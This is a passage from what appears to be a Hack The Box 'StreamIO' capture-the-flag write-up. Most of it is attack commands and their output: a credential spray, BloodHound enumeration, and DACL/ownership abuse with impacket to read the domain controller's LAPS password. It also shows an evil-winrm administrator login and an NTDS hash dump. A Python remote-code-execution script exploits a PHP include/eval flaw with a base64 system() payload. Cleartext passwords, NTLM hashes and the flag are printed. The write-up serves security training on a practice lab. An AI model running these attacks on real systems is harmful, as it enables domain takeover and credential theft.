-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:JDg0dd1s@d0p3cr3@t0r
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:paddpadd@12 STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:password@12 STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:66boysandgirls.. STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:paddpadd@12 STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:password@12 STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\A</span>dministrator:66boysandgirls.. STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:paddpadd@12 STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:password@12 STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\y</span>oshihide:66boysandgirls.. STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:n1kk1sd0p3t00:<span class="o">)</span> STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:paddpadd@12 STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:password@12 STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> streamIO.htb<span class="se">\M</span>artin:66boysandgirls.. STATUS_LOGON_FAILURE
-</code></pre></div>
-
-<p>And we are lucky. <strong>JDgodd</strong> has the password <strong>JDg0dd1s@d0p3cr3@t0r</strong>.</p>
-<p>But JDgodd can't login over WinRM. Time to enumerate all those permissions in Active Directory. Who can do this best? You guess, right, it's BloodHound.
-I am using <code>bloodhound-python</code> to retrieve the data even though I know it retrieves fewer data than SharpHound for example.</p>
-<div class="highlight"><pre><span></span><code>bloodhound-python -c All -u nikk37 -p <span class="s2">&quot;get_dem_girls2@yahoo.com&quot;</span> -d streamio.htb -ns <span class="nv">$TIP</span>
-INFO: Found AD domain: streamio.htb
-INFO: Connecting to LDAP server: dc.streamio.htb
-INFO: Found <span class="m">1</span> domains
-INFO: Found <span class="m">1</span> domains <span class="k">in</span> the forest
-INFO: Found <span class="m">1</span> computers
-INFO: Connecting to LDAP server: dc.streamio.htb
-INFO: Found <span class="m">8</span> users
-INFO: Connecting to GC LDAP server: dc.streamio.htb
-INFO: Found <span class="m">54</span> groups
-INFO: Found <span class="m">0</span> trusts
-INFO: Starting computer enumeration with <span class="m">10</span> workers
-INFO: Querying computer: DC.streamIO.htb
-INFO: Done <span class="k">in</span> 00M 05S
-</code></pre></div>
-
-<p>Generally, I would have used <code>bloodhound-import</code>, but it does not work with the newest Bloodhound format right now. Instead, I use the drag-and-drop feature of Bloodhound to import those JSON files to the neo4j database.
-BloodHound is a a great tool. At first, I display all those in the "Administrators" group. We can see <strong>Martin</strong> sitting there, waiting to be hacked. 
-<img alt="Active Directory Administrators Group" src="/images/htb/streamio/streamio.htb_bh_administrators.PNG">
-And we take a look on all those other users. <strong>nikk37</strong> is, who would expected that, in the <strong>Remote Users</strong> group, but nothing else is special about that account. <strong>yoshihide</strong> is neither interesting, no exiting groups or permissions.</p>
-<p>Different for <strong>JDgodd</strong>, this account not member of the <strong>Core Staff</strong> group, but has <strong>WriteOwner</strong> permission. This means that account, which we already have access to, can set the owner of that group. And we now what the owner can do...
-<img alt="JDgodd User" src="/images/htb/streamio/streamio.htb_bh_jdgodd.PNG"></p>
-<p>Even better, the <strong>Core Staff</strong> group has the <strong>ReadLAPSPassoword</strong> permission for the DC host, respectivly our target ;)
-<img alt="BloodHound Core Staff Group" src="/images/htb/streamio/streamio.htb_bh_core_staff.PNG"></p>
-<p>What are our next steps?</p>
-<ol>
-<li>Set the owner of <strong>Core Staff</strong> group to any user we own, by using JDgodd</li>
-<li>Add an account, we own, to the <strong>Core Staff</strong> group using the group owner, we set just before</li>
-<li>Use the newly added <strong>Core Staff</strong> account to read the LAPS password for the DC</li>
-<li>SUCCESS</li>
-</ol>
-<p>This could be done using the WinRM session of nikk37 and the credentials of JDgodd with Powershell, but... I like to do those things without using Windows too much.</p>
-<p>Shouts out to Charlie Bromberg (Shutdown) for releasing his scripts and tutorial. He recently made some pull requests to impacket, adding the ability to change the owner of an object <a href="https://github.com/SecureAuthCorp/impacket/pull/1323">1323</a> and also edit DACLs <a href="https://github.com/SecureAuthCorp/impacket/pull/1291">1291</a>. These pull requests are tutorials itself, but he also published examples at <a href="https://www.thehacker.recipes/ad/movement/dacl/grant-ownership?q=owneredit">https://www.thehacker.recipes/ad/movement/dacl/grant-ownership?q=owneredit</a> and <a href="https://www.thehacker.recipes/ad/movement/dacl/grant-rights?q=owneredit">https://www.thehacker.recipes/ad/movement/dacl/grant-rights?q=owneredit</a>.</p>
-<p>We start with owneredit, reading the current owner. Someone has already made JDgodd the owner of the Core Staff group.</p>
-<div class="highlight"><pre><span></span><code>owneredit.py -new-owner jdgodd -target <span class="s2">&quot;CORE STAFF&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
-Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
-
-<span class="o">[</span>*<span class="o">]</span> Current owner information below
-<span class="o">[</span>*<span class="o">]</span> - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
-<span class="o">[</span>*<span class="o">]</span> - sAMAccountName: JDgodd
-<span class="o">[</span>*<span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>JDgodd,CN<span class="o">=</span>Users,DC<span class="o">=</span>streamIO,DC<span class="o">=</span>htb
-</code></pre></div>
-
-<p>For completeness, I show the command that makes JDgodd as owner of "Core Staff"</p>
-<div class="highlight"><pre><span></span><code>owneredit.py -new-owner jdgodd -target <span class="s2">&quot;CORE STAFF&quot;</span> -action write streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
-Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
-
-<span class="o">[</span>*<span class="o">]</span> Current owner information below
-<span class="o">[</span>*<span class="o">]</span> - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
-<span class="o">[</span>*<span class="o">]</span> - sAMAccountName: JDgodd
-<span class="o">[</span>*<span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>JDgodd,CN<span class="o">=</span>Users,DC<span class="o">=</span>streamIO,DC<span class="o">=</span>htb
-<span class="o">[</span>*<span class="o">]</span> OwnerSid modified successfully!
-</code></pre></div>
-
-<p>How about DACLs? We see that JDgodd has the WriteOwner privilege.</p>
-<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
-Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
-
-<span class="o">[</span>*<span class="o">]</span> Parsing DACL
-<span class="o">[</span>*<span class="o">]</span> Printing parsed DACL
-<span class="o">[</span>*<span class="o">]</span> Filtering results <span class="k">for</span> SID <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">2</span><span class="o">]</span> info
-<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
-<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
-<span class="o">[</span>*<span class="o">]</span>     Access mask               : WriteOwner <span class="o">(</span>0x80000<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
-</code></pre></div>
-
-<p>Now we grant JDgodd full control over that group.</p>
-<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action write -ace-type allowed -rights FullControl streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
-Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
-
-<span class="o">[</span>*<span class="o">]</span> DACL backed up to dacledit-20220619-143823.bak
-<span class="o">[</span>*<span class="o">]</span> DACL modified successfully!
-</code></pre></div>
-
-<p>And we check if it worked.</p>
-<div class="highlight"><pre><span></span><code>dacledit.py -principal jdgodd -target <span class="s2">&quot;core staff&quot;</span> -action <span class="nb">read</span> streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r
-Impacket v0.10.1.dev1+20220613.133548.9425f2dc - Copyright <span class="m">2022</span> SecureAuth Corporation
-
-<span class="o">[</span>*<span class="o">]</span> Parsing DACL
-<span class="o">[</span>*<span class="o">]</span> Printing parsed DACL
-<span class="o">[</span>*<span class="o">]</span> Filtering results <span class="k">for</span> SID <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">2</span><span class="o">]</span> info
-<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
-<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
-<span class="o">[</span>*<span class="o">]</span>     Access mask               : WriteOwner <span class="o">(</span>0x80000<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span>   ACE<span class="o">[</span><span class="m">4</span><span class="o">]</span> info
-<span class="o">[</span>*<span class="o">]</span>     ACE Type                  : ACCESS_ALLOWED_ACE
-<span class="o">[</span>*<span class="o">]</span>     ACE flags                 : None
-<span class="o">[</span>*<span class="o">]</span>     Access mask               : FullControl <span class="o">(</span>0xf01ff<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span>     Trustee <span class="o">(</span>SID<span class="o">)</span>             : JDgodd <span class="o">(</span>S-1-5-21-1470860369-1569627196-4264678630-1104<span class="o">)</span>
-</code></pre></div>
-
-<p>Yes, it worked. The next step is to add a member to that group, because, if you remember, Core Staff members can read LAPS passwords for the DC. We are going to use the <strong>net</strong> utility.</p>
-<div class="highlight"><pre><span></span><code>net rpc group addmem <span class="s2">&quot;Core Staff&quot;</span> jdgodd -U <span class="s1">&#39;streamio.htb/jdgodd&#39;</span> -S <span class="nv">$TIP</span>
-Enter streamio.htb/jdgodd<span class="err">&#39;</span>s password:
-</code></pre></div>
-
-<p>There is no output, but we now try to read the LAPS password using CrackMapExec.</p>
-<div class="highlight"><pre><span></span><code>cme ldap <span class="nv">$TIP</span> -u JDgodd -p <span class="s2">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span> --module laps
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-LDAP        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\J</span>Dgodd:JDg0dd1s@d0p3cr3@t0r
-LAPS        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> Getting LAPS Passwords
-LAPS        <span class="m">10</span>.10.11.158    <span class="m">389</span>    DC               Computer: DC$                  Password: 3W7Z4<span class="o">}</span><span class="nv">$Wu2P0V</span>/
-</code></pre></div>
-
-<p>It totally worked, we got the LAPS password. We login using <strong>evil-winrm</strong> again, but no root flag in the Desktop directory. But there might be one at Martin's Desktop folder.</p>
-<div class="highlight"><pre><span></span><code>evil-winrm  -i <span class="nv">$TIP</span> -u administrator -p <span class="s1">&#39;3W7Z4}$Wu2P0V/&#39;</span>
-
-Evil-WinRM shell v3.4
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls
-
-
-    Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        <span class="m">2</span>/26/2022  <span class="m">12</span>:41 PM            <span class="m">274</span> clearing.bat
-
-
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls ..<span class="se">\D</span>esktop
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ls <span class="s2">&quot;C:/Users/Martin/Desktop/&quot;</span>
-
-
-    Directory: C:<span class="se">\U</span>sers<span class="se">\M</span>artin<span class="se">\D</span>esktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        <span class="m">6</span>/19/2022  <span class="m">11</span>:31 AM             <span class="m">34</span> root.txt
-
-
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> <span class="s2">&quot;C:/Users/Martin/Desktop/root.txt&quot;</span>
-f0873b557d5a24b8b77380938cb8623c
-</code></pre></div>
-
-<p>Done! Because we are nice, we run the <code>clearing.bat</code>, to reset the DACLs.</p>
-<h1>Appendix</h1>
-<div class="highlight"><pre><span></span><code>cme smb <span class="nv">$TIP</span> -u administrator -p <span class="s1">&#39;3W7Z4}$Wu2P0V/&#39;</span> --ntds
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\a</span>dministrator:3W7Z4<span class="o">}</span><span class="nv">$Wu2P0V</span>/ <span class="o">(</span>Pwn3d!<span class="o">)</span>
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Dumping the NTDS, this could take a <span class="k">while</span> so go grab a redbull...
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:eb8ddc2769f325862b883ff2dce33317:::
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f5142aae3cce656285ce4504605dec1:::
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               JDgodd:1104:aad3b435b51404eeaad3b435b51404ee:8846130392c4169cb552fe5b73b046af:::
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               Martin:1105:aad3b435b51404eeaad3b435b51404ee:a9347432fb0034dd1814ca794793d377:::
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               nikk37:1106:aad3b435b51404eeaad3b435b51404ee:17a54d09dd09920420a6cb9b78534764:::
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               yoshihide:1107:aad3b435b51404eeaad3b435b51404ee:6d21f46be3697ba16b6edef7b3399bf4:::
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:5618d95a388132e93bf622d6a6b2e84a:::
-</code></pre></div>
-
-<h2>Alternative way</h2>
-<p>I haven't found that directly, but there is another way to retrieve the data from the <strong>streamio_backup</strong> table. The web application has a flaw which allows <em>Local File inclusion</em>. This way includes that we extracted the MD5 hash of <strong>yoshihide</strong> successfully and get the corresponding password <strong>66boysandgirls..</strong>.</p>
-<p><code>/admin/index.php</code> has multiple GET parameters, one is hidden, called <strong>debug</strong>. Because I have access to the code, I can show the snippet.</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]))</span>
-    <span class="p">{</span>
-        <span class="k">echo</span> <span class="s1">&#39;this option is for developers only&#39;</span><span class="p">;</span>
-        <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;index.php&quot;</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">die</span><span class="p">(</span><span class="s1">&#39; ---- ERROR ----&#39;</span><span class="p">);</span>
-        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-            <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">];</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span>
-        <span class="k">require</span> <span class="s1">&#39;user_inc.php&#39;</span><span class="p">;</span>
-    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;staff&#39;</span><span class="p">]))</span>
-        <span class="k">require</span> <span class="s1">&#39;staff_inc.php&#39;</span><span class="p">;</span>
-    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;movie&#39;</span><span class="p">]))</span>
-        <span class="k">require</span> <span class="s1">&#39;movie_inc.php&#39;</span><span class="p">;</span>
-    <span class="k">else</span>
-<span class="cp">?&gt;</span><span class="x"></span>
-</code></pre></div>
-
-<p><code>?debug</code> includes everything set to, but <strong>index.php</strong>. We can read files with that vulnerability, like the misterious <code>master.php</code>.</p>
-<p><code>master.php</code> also has some interesting code at the end of the file:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]))</span>
-<span class="p">{</span>
-<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">&quot;index.php&quot;</span> <span class="p">)</span>
-<span class="k">eval</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]));</span>
-<span class="k">else</span>
-<span class="k">echo</span><span class="p">(</span><span class="s2">&quot; ---- ERROR ---- &quot;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>When called with the POST parameter <code>include</code> set to anything, it tries to read that file and <code>eval</code>s that content.. Nice..</p>
-<p>If we can get the script to load our own code, we have an <em>Remote Code Execution</em>.
-Fast forward, I have done it with curl, but you need the PHPSESSION cookie after you have logged in. I wrote a short Python script, to log me in and let me execute commands in a while loop, sort of poor man's shell.</p>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">urllib3</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] main&quot;</span><span class="p">)</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="s2">&quot;yoshihide&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="s2">&quot;66boysandgirls..&quot;</span><span class="p">,</span>
-    <span class="p">}</span>
-    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">r</span><span class="p">:</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
-        <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://streamio.htb/login.php&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
-        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;include&quot;</span><span class="p">:</span> <span class="s2">&quot;data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7&quot;</span><span class="p">}</span>
-        <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;CMD: &quot;</span><span class="p">)</span>
-        <span class="k">while</span> <span class="n">cmd</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
-            <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://streamio.htb/admin/?debug=master.php&amp;cmd=&quot;</span> <span class="o">+</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
-            <span class="n">html_out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
-            <span class="nb">print</span><span class="p">(</span><span class="n">html_out</span><span class="p">[</span><span class="n">html_out</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;&lt;input name=&quot;include&quot; hidden&gt;&#39;</span><span class="p">):])</span>
-            <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;CMD: &quot;</span><span class="p">)</span>
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
-    <span class="n">main</span><span class="p">()</span>
-</code></pre></div>
-
-<p>Execution down below</p>
-<div class="highlight"><pre><span></span><code>[+] main
-CMD: whoami
-&lt;input name=&quot;include&quot; hidden&gt;
-&lt;/form&gt;
-<span class="hll">streamio\yoshihide
-</span>                &lt;/div&gt;
-        &lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-CMD: hostname
-&lt;input name=&quot;include&quot; hidden&gt;
-&lt;/form&gt;
-<span class="hll">DC
-</span>                &lt;/div&gt;
-        &lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div>
-
-<p>The script logs in as yoshihide with the password we found in the users table. Using this session, the script asks for an input <em>cmd</em> and sends a POST to the <code>?debug</code> endpoint, were it includes <code>master.php</code>. As we know already, <code>master.php</code> interprets an include POST parameter. We set that base64 encoded <code>system($_GET['cmd']);</code>. In that request we also set the cmd parameter to our inputted cmd.</p>
-<p>The script trims the response a little to better see the output of the cmd. I highlighted the response of <code>whoami</code> and <code>hostname</code>. You can see, we are able to execute commands in context of <strong>yoshihide</strong>.</p>
-<p>Now, we could upload some sort of shell, like meterpreter or a C2 implant/beacon. The next step would be to log into the SQL database with the <strong>db_admin</strong> credentials found in the php files. The SQL server listens only on localhost, so we could use port forwarding, either included in our shell or using <a href="https://github.com/jpillora/chisel">chisel</a>. Than we are back on the track were we extract the infos from the <strong>streamio_backup</strong> tables, getting nikk37's MD5 hash.</p>
